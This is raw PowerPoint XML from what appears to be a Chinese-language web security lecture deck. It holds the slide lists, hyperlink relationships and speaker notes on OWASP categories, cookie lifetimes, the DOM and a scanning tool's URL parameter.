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5"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId221"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="1346" r:id="rId3"/>
    <p:sldId id="1945" r:id="rId4"/>
    <p:sldId id="1864" r:id="rId6"/>
    <p:sldId id="1865" r:id="rId7"/>
    <p:sldId id="1960" r:id="rId8"/>
    <p:sldId id="1961" r:id="rId9"/>
    <p:sldId id="1962" r:id="rId10"/>
    <p:sldId id="2094" r:id="rId11"/>
    <p:sldId id="2095" r:id="rId12"/>
    <p:sldId id="2096" r:id="rId13"/>
    <p:sldId id="2048" r:id="rId14"/>
    <p:sldId id="2076" r:id="rId15"/>
    <p:sldId id="2049" r:id="rId16"/>
    <p:sldId id="2050" r:id="rId17"/>
    <p:sldId id="2051" r:id="rId18"/>
    <p:sldId id="2052" r:id="rId19"/>
    <p:sldId id="2053" r:id="rId20"/>
    <p:sldId id="2054" r:id="rId21"/>
    <p:sldId id="2055" r:id="rId22"/>
    <p:sldId id="2056" r:id="rId23"/>
    <p:sldId id="2057" r:id="rId24"/>
    <p:sldId id="2058" r:id="rId25"/>
    <p:sldId id="1963" r:id="rId26"/>
    <p:sldId id="1964" r:id="rId27"/>
    <p:sldId id="1965" r:id="rId28"/>
    <p:sldId id="1966" r:id="rId29"/>
    <p:sldId id="1967" r:id="rId30"/>
    <p:sldId id="2045" r:id="rId31"/>
    <p:sldId id="1969" r:id="rId32"/>
    <p:sldId id="1868" r:id="rId33"/>
    <p:sldId id="1968" r:id="rId34"/>
    <p:sldId id="1872" r:id="rId35"/>
    <p:sldId id="1873" r:id="rId36"/>
    <p:sldId id="1874" r:id="rId37"/>
    <p:sldId id="1920" r:id="rId38"/>
    <p:sldId id="1972" r:id="rId39"/>
    <p:sldId id="1970" r:id="rId40"/>
    <p:sldId id="1971" r:id="rId41"/>
    <p:sldId id="1973" r:id="rId42"/>
    <p:sldId id="1951" r:id="rId43"/>
    <p:sldId id="1984" r:id="rId44"/>
    <p:sldId id="1985" r:id="rId45"/>
    <p:sldId id="1986" r:id="rId46"/>
    <p:sldId id="1987" r:id="rId47"/>
    <p:sldId id="1988" r:id="rId48"/>
    <p:sldId id="1989" r:id="rId49"/>
    <p:sldId id="1990" r:id="rId50"/>
    <p:sldId id="1991" r:id="rId51"/>
    <p:sldId id="1992" r:id="rId52"/>
    <p:sldId id="1993" r:id="rId53"/>
    <p:sldId id="1994" r:id="rId54"/>
    <p:sldId id="1995" r:id="rId55"/>
    <p:sldId id="1996" r:id="rId56"/>
    <p:sldId id="1997" r:id="rId57"/>
    <p:sldId id="1998" r:id="rId58"/>
    <p:sldId id="1999" r:id="rId59"/>
    <p:sldId id="2000" r:id="rId60"/>
    <p:sldId id="2001" r:id="rId61"/>
    <p:sldId id="2002" r:id="rId62"/>
    <p:sldId id="1952" r:id="rId63"/>
    <p:sldId id="1875" r:id="rId64"/>
    <p:sldId id="1876" r:id="rId65"/>
    <p:sldId id="1877" r:id="rId66"/>
    <p:sldId id="1878" r:id="rId67"/>
    <p:sldId id="1928" r:id="rId68"/>
    <p:sldId id="1929" r:id="rId69"/>
    <p:sldId id="1930" r:id="rId70"/>
    <p:sldId id="1879" r:id="rId71"/>
    <p:sldId id="1922" r:id="rId72"/>
    <p:sldId id="1923" r:id="rId73"/>
    <p:sldId id="1924" r:id="rId74"/>
    <p:sldId id="1925" r:id="rId75"/>
    <p:sldId id="1926" r:id="rId76"/>
    <p:sldId id="1927" r:id="rId77"/>
    <p:sldId id="1880" r:id="rId78"/>
    <p:sldId id="1979" r:id="rId79"/>
    <p:sldId id="2003" r:id="rId80"/>
    <p:sldId id="2005" r:id="rId81"/>
    <p:sldId id="2006" r:id="rId82"/>
    <p:sldId id="2007" r:id="rId83"/>
    <p:sldId id="2004" r:id="rId84"/>
    <p:sldId id="1980" r:id="rId85"/>
    <p:sldId id="2008" r:id="rId86"/>
    <p:sldId id="2011" r:id="rId87"/>
    <p:sldId id="2012" r:id="rId88"/>
    <p:sldId id="2013" r:id="rId89"/>
    <p:sldId id="2009" r:id="rId90"/>
    <p:sldId id="2010" r:id="rId91"/>
    <p:sldId id="2015" r:id="rId92"/>
    <p:sldId id="1981" r:id="rId93"/>
    <p:sldId id="2014" r:id="rId94"/>
    <p:sldId id="2016" r:id="rId95"/>
    <p:sldId id="2018" r:id="rId96"/>
    <p:sldId id="2029" r:id="rId97"/>
    <p:sldId id="2017" r:id="rId98"/>
    <p:sldId id="1982" r:id="rId99"/>
    <p:sldId id="2019" r:id="rId100"/>
    <p:sldId id="2020" r:id="rId101"/>
    <p:sldId id="2021" r:id="rId102"/>
    <p:sldId id="2022" r:id="rId103"/>
    <p:sldId id="2023" r:id="rId104"/>
    <p:sldId id="1983" r:id="rId105"/>
    <p:sldId id="2024" r:id="rId106"/>
    <p:sldId id="2025" r:id="rId107"/>
    <p:sldId id="2027" r:id="rId108"/>
    <p:sldId id="2026" r:id="rId109"/>
    <p:sldId id="2028" r:id="rId110"/>
    <p:sldId id="1887" r:id="rId111"/>
    <p:sldId id="1888" r:id="rId112"/>
    <p:sldId id="1889" r:id="rId113"/>
    <p:sldId id="1890" r:id="rId114"/>
    <p:sldId id="1891" r:id="rId115"/>
    <p:sldId id="1893" r:id="rId116"/>
    <p:sldId id="1897" r:id="rId117"/>
    <p:sldId id="1898" r:id="rId118"/>
    <p:sldId id="1899" r:id="rId119"/>
    <p:sldId id="1900" r:id="rId120"/>
    <p:sldId id="1901" r:id="rId121"/>
    <p:sldId id="1902" r:id="rId122"/>
    <p:sldId id="1903" r:id="rId123"/>
    <p:sldId id="1904" r:id="rId124"/>
    <p:sldId id="1905" r:id="rId125"/>
    <p:sldId id="1906" r:id="rId126"/>
    <p:sldId id="1907" r:id="rId127"/>
    <p:sldId id="1908" r:id="rId128"/>
    <p:sldId id="1909" r:id="rId129"/>
    <p:sldId id="1910" r:id="rId130"/>
    <p:sldId id="1914" r:id="rId131"/>
    <p:sldId id="1915" r:id="rId132"/>
    <p:sldId id="1916" r:id="rId133"/>
    <p:sldId id="2098" r:id="rId134"/>
    <p:sldId id="2099" r:id="rId135"/>
    <p:sldId id="2100" r:id="rId136"/>
    <p:sldId id="2101" r:id="rId137"/>
    <p:sldId id="2102" r:id="rId138"/>
    <p:sldId id="2046" r:id="rId139"/>
    <p:sldId id="1950" r:id="rId140"/>
    <p:sldId id="2043" r:id="rId141"/>
    <p:sldId id="2105" r:id="rId142"/>
    <p:sldId id="2080" r:id="rId143"/>
    <p:sldId id="2088" r:id="rId144"/>
    <p:sldId id="1959" r:id="rId145"/>
    <p:sldId id="2044" r:id="rId146"/>
    <p:sldId id="2081" r:id="rId147"/>
    <p:sldId id="2082" r:id="rId148"/>
    <p:sldId id="2083" r:id="rId149"/>
    <p:sldId id="2079" r:id="rId150"/>
    <p:sldId id="2084" r:id="rId151"/>
    <p:sldId id="2086" r:id="rId152"/>
    <p:sldId id="2087" r:id="rId153"/>
    <p:sldId id="2078" r:id="rId154"/>
    <p:sldId id="2077" r:id="rId155"/>
    <p:sldId id="2085" r:id="rId156"/>
    <p:sldId id="2089" r:id="rId157"/>
    <p:sldId id="2103" r:id="rId158"/>
    <p:sldId id="1917" r:id="rId159"/>
    <p:sldId id="1430" r:id="rId160"/>
    <p:sldId id="2148" r:id="rId161"/>
    <p:sldId id="2150" r:id="rId162"/>
    <p:sldId id="1974" r:id="rId163"/>
    <p:sldId id="1975" r:id="rId164"/>
    <p:sldId id="1976" r:id="rId165"/>
    <p:sldId id="1977" r:id="rId166"/>
    <p:sldId id="1978" r:id="rId167"/>
    <p:sldId id="2151" r:id="rId168"/>
    <p:sldId id="1918" r:id="rId169"/>
    <p:sldId id="2152" r:id="rId170"/>
    <p:sldId id="1919" r:id="rId171"/>
    <p:sldId id="2153" r:id="rId172"/>
    <p:sldId id="2063" r:id="rId173"/>
    <p:sldId id="2047" r:id="rId174"/>
    <p:sldId id="2154" r:id="rId175"/>
    <p:sldId id="2155" r:id="rId176"/>
    <p:sldId id="2156" r:id="rId177"/>
    <p:sldId id="2157" r:id="rId178"/>
    <p:sldId id="2158" r:id="rId179"/>
    <p:sldId id="2159" r:id="rId180"/>
    <p:sldId id="2160" r:id="rId181"/>
    <p:sldId id="2161" r:id="rId182"/>
    <p:sldId id="2162" r:id="rId183"/>
    <p:sldId id="2163" r:id="rId184"/>
    <p:sldId id="2164" r:id="rId185"/>
    <p:sldId id="2059" r:id="rId186"/>
    <p:sldId id="2060" r:id="rId187"/>
    <p:sldId id="2061" r:id="rId188"/>
    <p:sldId id="2115" r:id="rId189"/>
    <p:sldId id="2062" r:id="rId190"/>
    <p:sldId id="2124" r:id="rId191"/>
    <p:sldId id="2165" r:id="rId192"/>
    <p:sldId id="2125" r:id="rId193"/>
    <p:sldId id="2166" r:id="rId194"/>
    <p:sldId id="2167" r:id="rId195"/>
    <p:sldId id="2168" r:id="rId196"/>
    <p:sldId id="2108" r:id="rId197"/>
    <p:sldId id="2109" r:id="rId198"/>
    <p:sldId id="2110" r:id="rId199"/>
    <p:sldId id="2111" r:id="rId200"/>
    <p:sldId id="2126" r:id="rId201"/>
    <p:sldId id="2127" r:id="rId202"/>
    <p:sldId id="2128" r:id="rId203"/>
    <p:sldId id="2129" r:id="rId204"/>
    <p:sldId id="2130" r:id="rId205"/>
    <p:sldId id="2131" r:id="rId206"/>
    <p:sldId id="2132" r:id="rId207"/>
    <p:sldId id="2133" r:id="rId208"/>
    <p:sldId id="2134" r:id="rId209"/>
    <p:sldId id="2135" r:id="rId210"/>
    <p:sldId id="2136" r:id="rId211"/>
    <p:sldId id="2137" r:id="rId212"/>
    <p:sldId id="2138" r:id="rId213"/>
    <p:sldId id="2139" r:id="rId214"/>
    <p:sldId id="2140" r:id="rId215"/>
    <p:sldId id="2141" r:id="rId216"/>
    <p:sldId id="2142" r:id="rId217"/>
    <p:sldId id="2143" r:id="rId218"/>
    <p:sldId id="2144" r:id="rId219"/>
    <p:sldId id="2145" r:id="rId220"/>
  </p:sldIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:custDataLst>
    <p:tags r:id="rId226"/>
  </p:custDataLst>
  <p:defaultTextStyle>
    <a:defPPr>
      <a:defRPr lang="zh-CN"/>
    </a:defPPr>
    <a:lvl1pPr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b="1" kern="1200">
        <a:solidFill>
          <a:schemeClr val="tx1"/>
        </a:solidFill>
        <a:latin typeface="Tahoma" panose="020B060403050404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lf"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ACA00"/>
    <a:srgbClr val="3366FF"/>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64" autoAdjust="0"/>
    <p:restoredTop sz="86408" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="62" d="100"/>
          <a:sy n="62" d="100"/>
        </p:scale>
        <p:origin x="162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73746"/>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6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="tags/tag1.xml"/><Relationship Id="rId225" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/commentAuthors" Target="commentAuthors.xml"/><Relationship Id="rId224" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.xml"/><Relationship Id="rId223" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId222" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.xml"/><Relationship Id="rId221" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/handoutMaster" Target="handoutMasters/handoutMaster1.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3-11T15:36:15.920" idx="1">
    <p:pos x="10" y="10"/>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3B4577F0-ED67-4FFE-A316-3B3AEC2EA4D6}"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atin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2"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b="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E46A9642-FD4A-45CC-9F4F-8E10AB9AB4AA}"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37.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.laozuo.org/tag/lets-encrypt%e5%85%8d%e8%b4%b9ssl" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://letsencrypt.org/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.laozuo.org/tag/lets-encrypt" TargetMode="External"/><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s://www.freebuf.com/articles/web/200180.html" TargetMode="External"/><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www.freebuf.com/vuls/211822.html" TargetMode="External"/><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s://www.secrss.com/articles/18176" TargetMode="External"/><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www.secrss.com/articles/18176" TargetMode="External"/><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78.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.v2ex.com/t/656444" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.secrss.com/articles/18176" TargetMode="External"/><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www.secrss.com/articles/18363" TargetMode="External"/><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82.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.laozuo.org/tag/lets-encrypt%e5%85%8d%e8%b4%b9ssl" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://letsencrypt.org/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.laozuo.org/tag/lets-encrypt" TargetMode="External"/><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85.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.telerik.com/download/fiddler" TargetMode="External"/><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8793118-89C1-46D5-A5F9-D5DB293598F6}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778690" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4343400"/>
            <a:ext cx="5486400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>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郑晓峰“</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200" baseline="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> 端到端安全协议的威胁、演进和部署</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>”</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郑晓峰“</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200" baseline="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> 端到端安全协议的威胁、演进和部署</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>”</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在生成时就会被指定一个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Expire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值，这就是</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的生存周期，在这个周期内</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有效，超出周期</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就会被自动清除。有些页面将</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的生存周期设置为</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0</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或负值，这样在关闭页面时，浏览器立即清除</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，有效保护了用户隐私</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8793118-89C1-46D5-A5F9-D5DB293598F6}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778690" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1778691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4343400"/>
            <a:ext cx="5486400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>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1E3C7EC-96FC-4F22-A477-BF96B2BE937D}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459778" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459779" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>介绍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>机构是因为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>安全的内容是以其最新的研究成果为主线来讲。</a:t>
            </a:r>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51E3C7EC-96FC-4F22-A477-BF96B2BE937D}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459778" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459779" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>介绍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>机构是因为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>安全的内容是以其最新的研究成果为主线来讲。</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BAA5E20-1B7F-4D07-B649-3C73503692EC}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="503810" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="503811" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2004</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>版中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>A2 Broken Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>（访问控制不完善）可以理解成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2007</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>版中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>A4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>A10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>两种情况的合集</a:t>
            </a:r>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872ED6C-E0DE-4E88-992F-C6FD1BE37116}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="439298" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="439299" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>说明：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>、防火墙等安全措施对于此类攻击完全没用。</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p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>其中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”-u”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>参数用于指定检测的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"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37D0ADC0-B318-45CC-9130-F3B790A9505E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="428034" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="428035" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，文件对象模型，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Document Object Model.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>是给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>xml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件使用的一组</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，是建立网页与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>语言沟通的桥梁，比如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对象代表</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中的表格，可以由</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>脚本取用</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B9C413F-FDA4-48FD-8A72-A3A13F3BEBDA}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507906" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
